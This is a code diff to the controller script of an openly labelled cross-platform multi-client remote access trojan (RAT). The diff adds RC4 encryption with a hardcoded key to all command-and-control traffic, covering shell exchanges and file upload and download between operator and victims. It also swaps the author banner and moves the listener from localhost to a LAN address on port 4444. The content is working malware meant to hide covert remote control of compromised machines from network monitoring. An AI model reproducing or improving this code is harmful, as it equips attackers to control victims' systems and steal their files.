@@ -3,6 +3,42 @@ import json
 import threading
 import platform
 import os
+import base64
+
+key ='qazwsxedqazwsxed'
+
+def rc4_setup(key):
+    if isinstance(key,str):
+        key = key.encode()
+    s = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + s[i] + key [i % len(key)]) % 256
+        s[i],s[j] = s[j],s[i]
+    return s
+def rc4_crypt(data,key):
+    if isinstance(data,str):
+        data = data.encode()
+    s = rc4_setup(key)
+    i, j = 0, 0
+    res = []
+    for byte in data:
+        i =(i +1)%256
+        j =(j+s[i])%256
+        s[i],s[j]=s[j],s[i]
+        res.append(byte^s[(s[i]+ s[j])%256])
+
+    # print("加解密后长度:",len(res))
+    return bytes(res)
+
+def Rc4_Encrypt(data,key):
+    # print("加密前长度:",len(data))
+    return rc4_crypt(data,key)
+def Rc4_Decrypt(data,key):
+    # print("解密前长度:",len(data))
+    return rc4_crypt(data,key)
+
+
 print("[*] Checking Requirements Module.....")
 if platform.system().startswith("Windows"):
     try:
@@ -17,16 +53,18 @@ elif platform.system().startswith("Linux"):
         os.system("python3 -m pip install pystyle -q -q -q")
         from pystyle import *
 banner = Center.XCenter(r"""
-***********************************************************************
-*     ________   _______ _   _ ____        ____      _  _______        *
-*    / /  _ \ \ / /  ___| | | |  _ \      |  _ \    / \|_   _\ \       *
-*   | || |_) \ V /| |_  | | | | | | |_____| |_) |  / _ \ | |  | |      *
-*  < < |  __/ | | |  _| | |_| | |_| |_____|  _ <  / ___ \| |   > >     *
-*   | ||_|    |_| |_|    \___/|____/      |_| \_\/_/   \_\_|  | |      *
-*    \_\                                                     /_/       *
-*                       CROSS PLATFORM MULTI CLIENTS RAT               *
-*                              Coded By: Machine1337                   *
-************************************************************************                        
+************************************************************************************
+*                                                                                  *
+*    ██████╗         ██╗  ██╗        ██████╗ ██╗   ██╗███████╗██╗   ██╗██████╗     *
+*    ██╔══██╗ ██████╗██║  ██║        ██╔══██╗╚██╗ ██╔╝██╔════╝██║   ██║██╔══██╗    *
+*    ██████╔╝██╔════╝███████║        ██████╔╝ ╚████╔╝ █████╗  ██║   ██║██║  ██║    *
+*    ██╔══██╗██║     ╚════██║        ██╔═══╝   ╚██╔╝  ██╔══╝  ██║   ██║██║  ██║    *
+*    ██║  ██║╚██████╗     ██║███████╗██║        ██║   ██║     ╚██████╔╝██████╔╝    *
+*    ╚═╝  ╚═╝ ╚═════╝     ╚═╝╚══════╝╚═╝        ╚═╝   ╚═╝      ╚═════╝ ╚═════╝     *
+*                                                                                  *
+*                                               CROSS PLATFORM MULTI CLIENTS RAT   *
+*                                                                Coded By: AiENG   *
+************************************************************************************                       
 """)
 os.system("cls||clear")
 print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
@@ -35,31 +73,39 @@ client_usernames = {}
 targets = []
 connections = {}
 def recv_data(target):
-    data = ''
+    data = b''
     while True:
         try:
-            data = data + target.recv(1024).decode().rstrip()
-            return json.loads(data)
+            data = data + target.recv(1000000)#.decode().rstrip()
+            if data != b'' or len(data) > 0:
+                chunk = Rc4_Decrypt(data,key)
+                ret = json.loads(str(chunk,encoding='utf-8').rstrip())
+                return ret
         except ValueError:
             continue
 def send_data(target, data):
     jsondata = json.dumps(data)
-    target.send(jsondata.encode())
+    encrypted_data = Rc4_Encrypt(jsondata.encode(), key)  # 加密数据
+    target.send(encrypted_data)
+
 def download_file(target, file_name):
     f = open(file_name, 'wb')
     target.settimeout(1)
-    chunk = target.recv(1024)
+    chunk = Rc4_Decrypt(target.recv(10000000),key)
     while chunk:
         f.write(chunk)
         try:
-            chunk = target.recv(1024)
+            chunk = Rc4_Decrypt(target.recv(10000000),key)
         except socket.timeout as e:
             break
     target.settimeout(None)
     f.close()
 def upload_file(target, file_name):
     f = open(file_name, 'rb')
-    target.send(f.read())
+    data_to_send = f.read()
+    encrypted_data = Rc4_Encrypt(data_to_send, key)  # 加密数据
+    target.send(encrypted_data)
+    f.close()
 #coded By Machine1337....If u like the tool...Follow me on github: @machine1337
 def shell(target, ip):
     while True:
@@ -147,7 +193,7 @@ def selectclient():
 if __name__ == '__main__':
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("127.0.0.1", 4444))  # change ur ip and port here
+    s.bind(("192.168.230.100", 4444))  # change ur ip and port here
     s.listen(5)
     clients = 0
     stop_threads = False
